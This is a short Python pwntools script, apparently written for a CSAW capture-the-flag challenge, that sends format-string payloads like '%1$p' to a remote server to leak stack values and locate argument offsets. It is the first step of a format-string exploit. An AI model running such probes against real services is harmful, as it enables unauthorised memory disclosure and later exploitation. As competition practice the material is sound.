#!/usr/bin/env python3
"""Probe remote format-string arg offsets. Send immediately; no idle wait."""
import sys, time
from pwn import *

context.log_level = 'error'
HOST, PORT = 'pwn.chal.csaw.io', 21003

def run(payloads, delay=0.5):
    r = remote(HOST, PORT)
    time.sleep(delay)
    out = b''
    for p in payloads:
        assert len(p) <= 16, (len(p), p)
        r.send(p)
        time.sleep(delay)
        try:
            out += r.recv(timeout=3)
        except EOFError:
            out += b'<EOF>'
            break
    r.close()
    return out

if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'many'
    if mode == 'many':
        for i in range(1, 9):
            pl = ('%%%d$p' % i).encode()
            print(i, repr(run([pl])))
    elif mode == 'two':
        print(repr(run([b'%1$p.%2$p', b'%3$p.%4$p'])))
    elif mode == 'raw':
        print(repr(run([sys.argv[2].encode()])))

